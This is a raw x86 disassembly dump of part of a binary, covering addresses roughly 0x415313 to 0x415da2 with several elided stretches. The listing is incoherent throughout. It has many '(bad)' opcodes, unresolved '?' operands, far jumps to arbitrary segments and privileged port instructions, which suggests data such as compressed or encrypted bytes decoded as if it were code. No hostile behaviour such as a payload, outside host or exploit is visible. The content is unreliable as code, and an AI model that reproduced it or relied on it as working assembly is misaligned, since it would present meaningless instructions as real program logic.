  415313:	stc    
  415314:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  415316:	dec    ebp
  415317:	(bad)
  41531b:	lds    esi,FWORD PTR [ecx]
  41531d:	ss xchg ebx,eax
  41531f:	aam    0x8a
  415321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415322:	mov    WORD PTR [esi],?
  415324:	pop    ecx
  415325:	test   DWORD PTR [edx+0x20],eax
  415328:	mov    al,0x70
  41532a:	sahf   
  41532b:	adc    eax,0x9467e8e6
  415330:	mov    bl,0x2d
  415332:	mov    ds:0xa9e5c7d6,eax
  415337:	xor    BYTE PTR [edx],cl
  415339:	xor    BYTE PTR [eax],bh
  41533b:	fincstp 
  41533d:	and    al,0xb
  41533f:	mov    ecx,0x2c69bf3e
  415344:	std    
  415345:	scas   eax,DWORD PTR es:[edi]
  415346:	mov    WORD PTR [ecx+0x0],?
  415349:	enter  0x7d0,0x4b
  41534d:	sbb    eax,0x18f6c1c8
  415352:	test   al,0x5b
  415354:	fdivp  st(2),st
  415356:	xchg   ebx,eax
  415357:	(bad)  
  415359:	sub    ch,BYTE PTR [ebp+0x5aacb305]
  41535f:	cli    
  415360:	dec    ebx
  415361:	(bad)  
  415362:	mov    edi,0xd019b610
  415367:	add    ch,BYTE PTR [eax+0xb058d69]
  41536d:	ror    BYTE PTR ds:0x2647b356,1
  415373:	inc    ebp
  415374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415375:	out    dx,al
  415376:	xlat   BYTE PTR ds:[ebx]
  415377:	add    eax,0xff527bb3
  41537c:	test   al,0x62
  41537e:	cwde   
  41537f:	std    
  415380:	aas    
  415381:	or     BYTE PTR [ebx-0x3e],0xb3
  415385:	and    bh,ch
  415387:	mov    al,ds:0xe97d29b3
  41538c:	mov    bl,0x1d
  41538e:	inc    edi
  41538f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415390:	xor    ebx,DWORD PTR [ebx+0x28e80770]
  415396:	or     al,0xaf
  415398:	xchg   ebx,eax
  415399:	cmp    al,0xcd
  41539c:	popa   
  41539d:	and    eax,0x75018690
  4153a2:	xchg   esp,eax
  4153a3:	sub    bh,BYTE PTR [ebx+0x31cdec80]
  4153a9:	loop   0x4153e9
  4153ab:	cmp    ch,ah
  4153ad:	xchg   DWORD PTR [edx+0x10],esp
  4153b0:	fwait
  4153b1:	dec    esp
  4153b2:	add    edx,DWORD PTR gs:[esi+0x35]
  4153b6:	xchg   ebx,eax
  4153b7:	pop    edx
  4153b8:	add    ebx,ebp
  4153ba:	inc    edi
  4153bb:	jmp    0x99:0xda2d6e05
	...
  415432:	add    BYTE PTR [eax],al
  415434:	pop    ebx
  415435:	jae    0x415479
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	fs popa 
  415442:	pop    eax
  415443:	dec    ecx
  415444:	pusha  
  415445:	jmp    0x136544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	sub    DWORD PTR [esi+0x2a],ebx
  41544f:	fsub   DWORD PTR [edx]
  415451:	xlat   BYTE PTR ds:[ebx]
  415452:	lods   eax,DWORD PTR ds:[esi]
  415453:	sbb    DWORD PTR [edx-0x3d],ecx
  415456:	sub    ebp,DWORD PTR [edi-0x453e0985]
  41545c:	retf   
  41545d:	jmp    0x3b93:0xa5f7a2f7
  415464:	pop    edx
  415465:	scas   al,BYTE PTR es:[edi]
  415466:	mov    edx,0xd54e2127
  41546b:	mov    esi,0x159523ef
  415470:	sbb    eax,0xd779a845
  415475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415476:	or     BYTE PTR [esi-0x3d],dl
  415479:	aam    0xba
  41547b:	loop   0x41549f
  41547d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41547e:	cwde   
  41547f:	jo     0x415426
  415481:	fcomp  DWORD PTR [ecx+0x21]
  415484:	ins    BYTE PTR es:[edi],dx
  415485:	gs icebp 
  415487:	fsubr  QWORD PTR [edi+edx*1-0x6d]
  41548b:	fadd   st,st(5)
  41548d:	sbb    esp,DWORD PTR [ecx-0x7]
  415490:	loopne 0x4154d5
  415492:	mov    al,ds:0x99d5a824
  415497:	or     eax,0xc9623743
  41549c:	push   cs
  41549d:	int    0xae
  41549f:	retf   
  4154a0:	dec    ecx
  4154a1:	xchg   esp,eax
  4154a2:	in     eax,0xc9
  4154a4:	pop    ecx
  4154a5:	pop    es
  4154a6:	dec    esi
  4154a7:	sbb    BYTE PTR [esi+0x67],bl
  4154aa:	iret   
  4154ab:	xchg   DWORD PTR [esi-0x4423194d],esi
  4154b1:	lods   eax,DWORD PTR ds:[esi]
  4154b2:	in     al,0xc4
  4154b4:	adc    edi,DWORD PTR [edx+0x70728704]
  4154ba:	test   DWORD PTR [eax-0x5f6e6e5f],0xec9a0843
  4154c4:	sub    al,0xa9
  4154c6:	mov    eax,0x757280c5
  4154cb:	arpl   WORD PTR [ecx-0x7ef4b7f9],si
  4154d1:	sahf   
  4154d2:	nop
  4154d3:	aam    0x75
  4154d5:	mov    ebx,0x6f077946
  4154da:	aam    0x7d
  4154dc:	sbb    dl,BYTE PTR [edx+0x47]
  4154df:	sar    ebp,cl
  4154e1:	int3   
  4154e2:	dec    ebx
  4154e3:	mov    edx,ebx
  4154e5:	ins    BYTE PTR es:[edi],dx
  4154e6:	mov    eax,ds:0x5235bdc9
  4154eb:	repnz repnz push 0x4b7932d9
  4154f2:	iret   
  4154f3:	sar    DWORD PTR [ecx+0x4a],1
  4154f6:	sbb    al,0x3b
  4154f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154fa:	or     ebx,DWORD PTR [edx]
  4154fc:	push   0x879eb8c
  415501:	popa   
  415502:	push   0xffffffbe
  415504:	outs   dx,DWORD PTR ds:[esi]
  415505:	pop    esi
  415506:	sbb    dl,BYTE PTR [edi-0x65]
  415509:	les    esi,FWORD PTR [edx]
  41550b:	push   ebx
  41550c:	test   al,0xe0
  41550e:	inc    ebp
  41550f:	(bad)  
  415510:	sti    
  415511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415512:	stc    
  415513:	mov    WORD PTR [esi+0x62],gs
  415516:	scas   al,BYTE PTR es:[edi]
  415517:	ret    0x4f78
  41551a:	dec    esp
  41551b:	mov    edx,ds
  41551d:	push   0xb1328036
  415522:	cmp    BYTE PTR [edx+esi*8],ah
  415525:	xchg   ebx,eax
  415526:	out    0x41,al
  415528:	xchg   esp,eax
  415529:	and    DWORD PTR [ecx],edx
  41552b:	jecxz  0x41552a
  41552d:	xor    esp,eax
  41552f:	les    ebp,FWORD PTR [eax+edi*2+0x43b10b49]
  415536:	mov    ebp,0x910b9be7
  41553b:	and    DWORD PTR [edi],ecx
  41553d:	mov    dl,0xd
  41553f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415540:	jae    0x415542
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	mov    WORD PTR [edi+0x1e],?
  4155c3:	fcom   QWORD PTR [ebp-0x16]
  4155c6:	add    BYTE PTR [eax],al
  4155c8:	cmc    
  4155c9:	add    BYTE PTR [eax],al
  4155cb:	add    BYTE PTR [ecx-0x1c3f66bb],bl
  4155d1:	imul   ecx,DWORD PTR [esi+esi*2],0xffffff9f
  4155d5:	je     0x415632
  4155d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d8:	mov    al,ds:0xb0927653
  4155dd:	fimul  WORD PTR [esi]
  4155df:	xchg   ebp,eax
  4155e0:	sbb    BYTE PTR [ecx-0xe],cl
  4155e3:	jae    0x415619
  4155e5:	dec    ecx
  4155e6:	pushf  
  4155e7:	inc    eax
  4155e8:	and    ecx,DWORD PTR [eax]
  4155ea:	sub    ebx,eax
  4155ec:	mov    ch,0x86
  4155ee:	(bad)  
  4155ef:	push   ebp
  4155f0:	lods   al,BYTE PTR ds:[esi]
  4155f1:	mov    dl,0x67
  4155f3:	xor    eax,0x2bb42777
  4155f8:	sahf   
  4155f9:	mov    cl,0xdb
  4155fb:	mov    ch,0x8e
  4155fd:	jbe    0x415584
  4155ff:	mov    eax,0xb6ab7bab
  415604:	pusha  
  415605:	jne    0x41561e
  415607:	xchg   ecx,eax
  415608:	mov    edx,DWORD PTR [edx]
  41560a:	stos   DWORD PTR es:[edi],eax
  41560b:	xchg   ebx,esi
  41560d:	xchg   edx,eax
  41560e:	dec    edx
  41560f:	retf   0xce10
  415612:	test   esp,ebp
  415614:	inc    edi
  415615:	stc    
  415616:	cld    
  415617:	popf   
  415618:	scas   al,BYTE PTR es:[edi]
  415619:	arpl   WORD PTR [esi+0x3d],di
  41561c:	daa    
  41561d:	shl    BYTE PTR [edx+0x55],1
  415620:	xchg   esi,eax
  415621:	out    dx,al
  415622:	pop    eax
  415623:	loop   0x4155d0
  415625:	not    BYTE PTR ds:0x681d5380
  41562b:	push   ecx
  41562c:	in     al,dx
  41562d:	add    ah,ah
  41562f:	or     al,0x4c
  415631:	xchg   esi,eax
  415632:	pop    esi
  415633:	retf   0x6872
  415636:	fdivr  DWORD PTR [edx+0x75]
  415639:	mov    ah,0x32
  41563b:	sbb    eax,0x8783f88c
  415640:	add    cl,dh
  415642:	push   ss
  415643:	gs xor edx,ebp
  415646:	jl     0x4155d6
  415648:	sahf   
  415649:	jns    0x415600
  41564b:	ins    BYTE PTR es:[edi],dx
  41564c:	repz sub bh,BYTE PTR [edx]
  41564f:	fistp  QWORD PTR [si+0x176c]
  415654:	lods   al,BYTE PTR ds:[esi]
  415655:	sub    DWORD PTR [edx+ebp*2],esp
  415658:	arpl   WORD PTR [ecx+0x60f52f9f],ax
  41565e:	sbb    BYTE PTR [eax],ah
  415660:	repz out dx,al
  415662:	sti    
  415663:	imul   esi,ebx,0x7bdf3ddf
  415669:	out    0x41,al
  41566b:	fnstcw WORD PTR [eax+0x28]
  41566e:	(bad)  
  41566f:	not    DWORD PTR [edx-0x46]
  415672:	pushf  
  415673:	aaa    
  415674:	stos   DWORD PTR es:[edi],eax
  415675:	jmp    0x28bf:0xf71bb30a
  41567c:	leave  
  41567d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41567e:	mov    ebp,ebx
  415680:	inc    ebp
  415681:	push   ds
  415682:	xchg   edi,eax
  415683:	es mov dl,bl
  415686:	retf   
  415687:	inc    ecx
  415688:	sub    BYTE PTR [esi+0x44],cl
  41568b:	(bad)  
  41568c:	xchg   esi,eax
  41568d:	or     eax,0x4ae211ba
  415692:	scas   al,BYTE PTR es:[edi]
  415693:	xor    dh,0xc2
  415696:	adc    BYTE PTR [edx-0x11],dl
  415699:	mov    al,0x83
  41569b:	fistp  WORD PTR [eax+0x5eb4809e]
  4156a1:	stos   BYTE PTR es:[edi],al
  4156a2:	xchg   ecx,eax
  4156a3:	jp     0x415642
  4156a5:	stc    
  4156a6:	add    BYTE PTR [edx-0x4a],ch
  4156a9:	loope  0x41562c
  4156ab:	or     eax,0xf29e593b
  4156b0:	push   cs
  4156b1:	xlat   BYTE PTR ds:[ebx]
  4156b2:	push   esp
  4156b3:	mov    ebx,0x39c705a
  4156b8:	inc    ebp
  4156b9:	and    eax,0x9e41eaa7
  4156be:	aam    0xd0
  4156c0:	pop    ecx
	...
  415731:	add    BYTE PTR [eax],al
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0x44d29d3
  415743:	push   ds
  415744:	dec    edx
  415745:	jmp    0x415747
  415747:	add    ch,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    ah,bl
  41574d:	pop    ebx
  41574e:	(bad)  
  41574f:	sub    bl,BYTE PTR [eax]
  415751:	fnstcw WORD PTR [ebp+0x200f965f]
  415757:	xlat   BYTE PTR ds:[ebx]
  415758:	xchg   ebx,eax
  415759:	sbb    ebx,DWORD PTR [ebx+edi*1-0x49ea62b7]
  415760:	adc    DWORD PTR [ebx-0x38],0x11
  415764:	xor    DWORD PTR [edi],edx
  415766:	ftst   
  415768:	and    DWORD PTR [ebx],ecx
  41576a:	stc    
  41576b:	push   eax
  41576c:	or     al,0x7a
  41576e:	cwde   
  41576f:	adc    BYTE PTR [esi],bh
  415771:	xchg   edi,eax
  415772:	mov    edx,0x38727bf5
  415777:	inc    eax
  415778:	fstp   QWORD PTR [edi-0x1f]
  41577b:	inc    ebp
  41577c:	(bad)  
  41577d:	ss (bad) 
  41577f:	cdq    
  415780:	sub    esp,edx
  415782:	inc    eax
  415783:	iret   
  415784:	mov    ds:0x60a9155d,al
  415789:	pop    ss
  41578a:	push   ds
  41578b:	pop    ebp
  41578c:	jne    0x41574c
  41578e:	call   0x29fc:0x5d3be88d
  415795:	pop    ss
  415796:	cmp    DWORD PTR [eax+0x4b6b8d03],0x52
  41579d:	jg     0x41575f
  41579f:	rcr    BYTE PTR [eax-0x1c40a05],cl
  4157a5:	mov    DWORD PTR [eax],esi
  4157a7:	sub    WORD PTR [ecx+0x13dd0fa8],sp
  4157ae:	dec    esp
  4157af:	cmp    DWORD PTR [ecx],0x36e57e84
  4157b5:	aaa    
  4157b6:	and    BYTE PTR [edx+eiz*1-0x4a34a696],al
  4157bd:	xor    BYTE PTR [ebx-0x28ad763f],ah
  4157c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157c4:	xchg   BYTE PTR [ecx-0x11ed225a],dh
  4157ca:	mov    BYTE PTR [ebx+0x7c3f575b],0x8b
  4157d1:	and    al,0x63
  4157d3:	call   0x76d9ce3f
  4157d8:	scas   eax,DWORD PTR es:[edi]
  4157d9:	into   
  4157da:	xor    cl,BYTE PTR [eax-0x69]
  4157dd:	inc    ecx
  4157de:	inc    eax
  4157df:	sub    BYTE PTR [ecx+edi*2-0x3c1297cb],bl
  4157e6:	mov    bl,0x73
  4157e8:	sbb    BYTE PTR [ecx+0x7713b338],dh
  4157ee:	and    esi,eax
  4157f0:	push   cs
  4157f1:	mov    WORD PTR [eax],?
  4157f3:	rol    esi,1
  4157f5:	loope  0x4157d0
  4157f7:	xor    BYTE PTR [edi+ecx*2+0x64],dl
  4157fb:	lds    esi,FWORD PTR [edx+0x38]
  4157fe:	in     eax,dx
  4157ff:	out    0xe4,eax
  415801:	jae    0x4157bd
  415803:	xchg   ecx,eax
  415804:	mov    eax,esp
  415806:	or     eax,0x4f855efb
  41580c:	mov    DWORD PTR [ebp-0x52],ebx
  41580f:	add    BYTE PTR [ebx],dh
  415811:	sub    BYTE PTR [ebx+esi*2],0x72
  415815:	pop    edx
  415816:	shr    BYTE PTR [eax+0x29031a70],1
  41581c:	in     eax,0x95
  41581e:	adc    BYTE PTR [edi],0xa4
  415821:	mov    esi,0x54f3ce8f
  415826:	or     DWORD PTR [ebx],esp
  415828:	jecxz  0x415802
  41582a:	ror    al,0x86
  41582d:	mov    al,ds:0xb9521b82
  415832:	xchg   ecx,eax
  415833:	sahf   
  415834:	repz jne 0x41581e
  415837:	adc    edi,DWORD PTR [ebp-0x29]
  41583a:	inc    ebp
  41583b:	test   BYTE PTR [ebx-0x28],dl
  41583e:	in     eax,dx
  41583f:	mov    BYTE PTR [eax+eax*1],bl
	...
  4158b2:	add    BYTE PTR [eax],al
  4158b4:	or     edi,DWORD PTR [esi-0x2e]
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x53adaefe
  4158c3:	sar    BYTE PTR [edi],0xec
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    BYTE PTR [eax],bl
  4158cd:	test   al,0x83
  4158cf:	jmp    0x415934
  4158d1:	xchg   ebx,eax
  4158d2:	in     eax,0x5a
  4158d4:	in     al,0x20
  4158d6:	jle    0x415917
  4158d8:	dec    edx
  4158d9:	mov    ds:0xbce59fac,eax
  4158de:	out    0xe8,al
  4158e0:	repnz sbb BYTE PTR [ebp-0x19bc8223],dl
  4158e7:	add    eax,DWORD PTR [eax]
  4158e9:	add    BYTE PTR ds:0xd82091cc,ah
  4158ef:	outs   dx,DWORD PTR ds:[esi]
  4158f0:	mov    eax,0xfd2df382
  4158f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158f6:	pop    eax
  4158f7:	call   0xb48a:0xaed59cd6
  4158fe:	in     eax,dx
  4158ff:	dec    edx
  415900:	addr16 jne 0x41591b
  415903:	sub    BYTE PTR [eax+esi*4+0x5d],ch
  415907:	nop
  415908:	aas    
  415909:	lea    ebx,[edx+0x58b8fb70]
  41590f:	call   0x46bf:0x2c779c95
  415916:	xor    cl,dl
  415918:	sbb    edi,DWORD PTR [ecx+0x64]
  41591b:	or     eax,DWORD PTR [esi]
  41591d:	dec    ebp
  41591e:	dec    ebp
  41591f:	or     DWORD PTR [ecx+0x5085aa59],edi
  415925:	fwait
  415926:	cmp    DWORD PTR gs:[esi+ebp*2-0x4c],ebp
  41592b:	dec    ebx
  41592c:	out    dx,eax
  41592d:	repz div BYTE PTR [esi]
  415930:	adc    edx,edx
  415932:	adc    BYTE PTR [edx+0x59],0xe5
  415936:	mov    ah,0x1c
  415938:	pop    esp
  415939:	in     al,dx
  41593a:	sub    esp,DWORD PTR [ecx+0x4]
  41593d:	jns    0x41597a
  41593f:	sbb    eax,0x54efb024
  415944:	cmc    
  415945:	ins    DWORD PTR es:[edi],dx
  415946:	repnz div BYTE PTR [ebp-0x65040449]
  41594d:	call   0x1b71:0xd51d3c8c
  415954:	inc    esi
  415955:	call   0x260db3d5
  41595a:	fdivr  QWORD PTR [eax+ebp*1]
  41595d:	adc    eax,0x3400d190
  415962:	dec    eax
  415963:	mov    edx,0xe111d0cb
  415968:	mov    cl,0x5b
  41596a:	adc    eax,DWORD PTR [ecx]
  41596c:	je     0x41596e
  41596e:	jbe    0x4159d9
  415970:	ins    BYTE PTR es:[edi],dx
  415971:	(bad)  
  415972:	inc    eax
  415973:	mov    dh,BYTE PTR [edx]
  415975:	inc    edx
  415976:	xor    edi,DWORD PTR [bp+si]
  415979:	jnp    0x41592b
  41597b:	push   0x53
  41597d:	xchg   BYTE PTR [edx-0x19],bl
  415980:	int3   
  415981:	cmp    DWORD PTR [eax+0x6734ebbe],eax
  415987:	ss stos DWORD PTR es:[edi],eax
  415989:	mul    DWORD PTR ds:0x840e0e3e
  41598f:	ret    
  415990:	jns    0x415928
  415992:	(bad)  
  415994:	cmp    esi,DWORD PTR [ebx+0x24]
  415997:	les    esp,FWORD PTR [ebp+0xd891b71]
  41599d:	dec    esi
  41599e:	or     dh,bl
  4159a0:	popf   
  4159a1:	jbe    0x4159ec
  4159a3:	xchg   esp,eax
  4159a4:	scas   al,BYTE PTR es:[edi]
  4159a5:	push   es
  4159a6:	mov    al,ds:0x3caffc43
  4159ab:	popa   
  4159ac:	adc    al,BYTE PTR [edi+0x13]
  4159af:	xor    ebx,DWORD PTR [ecx+0x60468c7]
  4159b5:	outs   dx,BYTE PTR ds:[esi]
  4159b6:	jecxz  0x415975
  4159b8:	jmp    0xab4be7de
  4159bd:	sub    ah,dl
  4159bf:	cmp    BYTE PTR [edi+0x0],dl
	...
  415a31:	add    BYTE PTR [eax],al
  415a33:	add    BYTE PTR [edi+0x7e363ed9],bl
  415a39:	neg    DWORD PTR [edi+0x4f7241f9]
  415a3f:	lahf   
  415a40:	mov    fs,WORD PTR [esp+eiz*2]
  415a43:	jmp    0x42477c
  415a48:	cmc    
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [ebx-0x191b2127],dl
  415a51:	xchg   ebx,eax
  415a52:	sub    dl,BYTE PTR [ecx]
  415a54:	or     eax,0x260625f4
  415a59:	icebp  
  415a5a:	xchg   esp,eax
  415a5b:	test   al,0xea
  415a5d:	inc    edx
  415a5e:	jecxz  0x415abd
  415a60:	cmpps  xmm3,XMMWORD PTR [esi],0x84
  415a64:	xor    eax,0x9405d2e1
  415a69:	mov    al,0x7a
  415a6b:	cmp    dl,BYTE PTR [ebp+0x371bcb38]
  415a71:	pop    edx
  415a72:	cmp    DWORD PTR [edx],ebx
  415a74:	mov    cl,0xd1
  415a76:	or     bl,BYTE PTR [edx-0x1d]
  415a79:	xchg   esi,eax
  415a7a:	bound  edi,QWORD PTR [eax-0x4a]
  415a7d:	popa   
  415a7e:	ins    BYTE PTR es:[edi],dx
  415a7f:	nop    DWORD PTR [eax+0x440ec2ef]
  415a86:	mov    ah,0x4b
  415a88:	xor    DWORD PTR [esi+0x5ed24670],0xffffffe1
  415a8f:	push   esi
  415a90:	add    BYTE PTR [ebx+ecx*8+0x5079581d],ch
  415a97:	jnp    0x415a8a
  415a99:	out    0x1c,al
  415a9b:	mov    ah,0xf
  415a9d:	ret    
  415a9e:	jnp    0x415a33
  415aa0:	sbb    esi,DWORD PTR [edx]
  415aa2:	add    esp,esi
  415aa4:	fs adc al,0x64
  415aa7:	int    0xa2
  415aa9:	mov    dh,0xe2
  415aab:	inc    esi
  415aac:	fild   WORD PTR [edi+0x5a2d23c9]
  415ab2:	and    DWORD PTR [ecx+0x4a62c7c8],0x38
  415ab9:	and    eax,DWORD PTR [ebx+ebx*8+0x38]
  415abd:	fnstcw WORD PTR [ebp+0x26304e16]
  415ac3:	mov    ds:0xebef3a94,al
  415ac8:	lds    edx,FWORD PTR [esi]
  415aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415acb:	std    
  415acc:	popf   
  415acd:	neg    BYTE PTR [ecx-0x7a4f769d]
  415ad3:	ret    0xb3c6
  415ad6:	test   DWORD PTR [edx-0x64],ecx
  415ad9:	loop   0x415ab5
  415adb:	jmp    0x72c6:0x864d2ff5
  415ae2:	push   edi
  415ae3:	(bad)  
  415ae4:	addr16 mov cl,0x18
  415ae7:	jmp    0xf38fe24b
  415aec:	push   eax
  415aed:	adc    eax,0xfe3dab69
  415af2:	loope  0x415acd
  415af4:	cmp    DWORD PTR [edi],0x2b98f0d5
  415afa:	push   0x26
  415afc:	sub    ah,BYTE PTR ds:0xa123d512
  415b02:	(bad)  
  415b03:	idiv   DWORD PTR [eax]
  415b05:	jmp    0x48d3:0x47daaa7c
  415b0c:	lods   al,BYTE PTR ds:[esi]
  415b0d:	sar    BYTE PTR [esi],0x7f
  415b10:	scas   al,BYTE PTR es:[edi]
  415b11:	push   0x308cdea
  415b16:	adc    edx,DWORD PTR [edx-0x41]
  415b19:	int    0x1c
  415b1b:	pusha  
  415b1c:	gs loope 0x415b45
  415b1f:	retf   
  415b20:	ss jns 0x415b8f
  415b23:	inc    edx
  415b24:	lds    ebx,FWORD PTR [edi+esi*1]
  415b27:	inc    esp
  415b28:	mov    cl,BYTE PTR ds:0xd9ba527d
  415b2e:	inc    esi
  415b2f:	pop    es
  415b30:	xchg   edi,eax
  415b31:	aas    
  415b32:	sbb    DWORD PTR [esi+0x7f],edx
  415b35:	gs xchg edi,eax
  415b37:	lock add al,0x14
  415b3a:	xchg   edi,eax
  415b3b:	fsub   QWORD PTR [edi+0x1b]
  415b3e:	xor    DWORD PTR [edi+0xe9],edi
	...
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	es and al,0xbe
  415bc3:	in     eax,0x29
  415bc5:	out    dx,al
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [edi],dh
  415bcd:	cmp    esi,DWORD PTR [ebx+eiz*2-0x4b]
  415bd1:	je     0x415bbc
  415bd3:	sub    al,0x10
  415bd5:	mov    dl,0x31
  415bd7:	dec    esi
  415bd8:	adc    edi,eax
  415bda:	xchg   ebx,eax
  415bdb:	dec    ecx
  415bdc:	and    ebx,DWORD PTR [edx+0x7]
  415bdf:	or     edi,0x72
  415be2:	mov    dh,0x7d
  415be4:	fcomp  DWORD PTR [esi]
  415be6:	retf   
  415be7:	pushf  
  415be8:	add    esi,ebx
  415bea:	bound  esp,QWORD PTR [ecx-0x57d5c81d]
  415bf0:	xor    dh,dl
  415bf2:	jno    0x415c2b
  415bf4:	clc    
  415bf5:	mov    eax,ds:0x53e4766d
  415bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfb:	cmp    edx,0x57d4c879
  415c01:	stos   DWORD PTR es:[edi],eax
  415c02:	cmc    
  415c03:	add    eax,0xb2546d0d
  415c08:	push   ecx
  415c09:	mov    edx,0xac7098b5
  415c0e:	ret    0x898b
  415c11:	adc    bl,BYTE PTR [edi-0x623309]
  415c17:	fldcw  WORD PTR [ebp+0x3d]
  415c1a:	xor    esp,DWORD PTR [esi]
  415c1c:	mov    bh,0x61
  415c1e:	rcl    DWORD PTR [edi+0x6c],1
  415c21:	(bad)  
  415c22:	in     eax,dx
  415c23:	fscale 
  415c25:	sahf   
  415c26:	std    
  415c27:	enter  0x7283,0x5d
  415c2b:	adc    eax,0xfdde13f2
  415c30:	popa   
  415c31:	dec    esi
  415c32:	mov    ah,ch
  415c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c35:	arpl   WORD PTR [ebx],dx
  415c37:	mov    gs,edx
  415c39:	push   ss
  415c3a:	mov    esi,0x1150dda
  415c3f:	out    0xd,al
  415c41:	xor    al,0x46
  415c43:	aam    0x4e
  415c45:	or     al,0xf0
  415c47:	sbb    edx,DWORD PTR [edx+0x5c8bfaba]
  415c4d:	pop    ss
  415c4e:	not    al
  415c50:	jecxz  0x415bda
  415c52:	push   0x387c06c5
  415c57:	test   ebp,0x47814b21
  415c5d:	add    eax,0xab12242a
  415c62:	lods   eax,DWORD PTR ds:[esi]
  415c63:	dec    ebx
  415c64:	xor    al,0xbd
  415c66:	jae    0x415cc8
  415c68:	sbb    eax,0x61693887
  415c6d:	push   0xffffffed
  415c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c70:	jne    0x415c9a
  415c72:	stc    
  415c73:	rcr    DWORD PTR [edi],1
  415c75:	and    esi,esi
  415c77:	mov    WORD PTR [edi+0x3c],ds
  415c7a:	or     eax,0xadc6f5ad
  415c7f:	rcl    ah,0x65
  415c82:	dec    esi
  415c83:	pop    ss
  415c84:	pusha  
  415c85:	cdq    
  415c86:	mov    ?,WORD PTR [ecx+0x5876c9c5]
  415c8c:	test   eax,0x8a2593ee
  415c91:	dec    ecx
  415c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c93:	imul   edi,DWORD PTR [edx],0xffffffce
  415c96:	push   0x63
  415c98:	pop    eax
  415c99:	fsub   st(1),st
  415c9b:	mov    BYTE PTR [esi-0x7d1cc3bf],dh
  415ca1:	and    al,0x37
  415ca3:	(bad)  
  415ca4:	fcom   DWORD PTR [bp+si]
  415ca7:	stos   BYTE PTR es:[edi],al
  415ca8:	mov    ah,0x3
  415caa:	jp     0x415d0a
  415cac:	jl     0x415d0c
  415cae:	dec    ebp
  415caf:	adc    ebx,DWORD PTR [ebx+0x213b8a82]
  415cb5:	mov    bh,0xdb
  415cb7:	add    al,BYTE PTR [edi+ecx*1]
  415cba:	aaa    
  415cbb:	mov    bl,0x9e
  415cbd:	int3   
  415cbe:	push   ds
  415cbf:	(bad)  
  415cc0:	adc    eax,0x0
	...
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0x1631:0xd9ae72f
  415d44:	push   ds
  415d45:	out    dx,eax
  415d46:	add    BYTE PTR [eax],al
  415d48:	cmc    
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    BYTE PTR [esi+0xf78bb3a],bl
  415d51:	mov    ebp,0xb3af5ea4
  415d56:	add    ah,BYTE PTR [edi+edi*8+0x7d]
  415d5a:	add    esp,ebx
  415d5c:	push   0x8
  415d5e:	cwde   
  415d5f:	and    DWORD PTR [edx+0x1e],esp
  415d62:	iret   
  415d63:	mov    dl,0xc9
  415d65:	fnstcw WORD PTR [ebx+0x35a21765]
  415d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d6c:	out    0x5f,al
  415d6e:	push   edx
  415d6f:	lods   eax,DWORD PTR ds:[esi]
  415d70:	push   esp
  415d71:	repz lock repnz in al,0x9b
  415d76:	bound  esi,QWORD PTR ds:0x1ed8a1b7
  415d7c:	daa    
  415d7d:	push   ds
  415d7e:	sbb    dl,BYTE PTR [ecx+0x6f6b9ae8]
  415d84:	mov    ebp,esi
  415d86:	jb     0x415d66
  415d88:	dec    edi
  415d89:	lds    edi,FWORD PTR [edx-0x290965a4]
  415d8f:	cmp    al,bh
  415d91:	sti    
  415d92:	mov    ch,0x79
  415d94:	xchg   edx,eax
  415d95:	scas   al,BYTE PTR es:[edi]
  415d96:	in     eax,dx
  415d97:	jns    0x415db9
  415d99:	jmp    0x70e7:0x866c65e2
  415da0:	aam    0xe0
  415da2:	push   ebp
